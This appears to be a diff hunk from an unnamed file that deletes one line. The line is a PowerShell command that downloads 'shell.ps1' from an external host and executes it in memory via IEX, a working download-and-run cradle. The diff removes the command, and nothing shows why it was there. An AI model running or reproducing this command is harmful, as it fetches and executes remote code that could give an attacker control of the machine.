@@ -1,1 +1,0 @@
-powershell IEX (New-Object Net.WebClient).DownloadString('https://q7yuliu1k9d4ddanxb3opeqvdmjgd42.c.39.rs:443/shell.ps1')
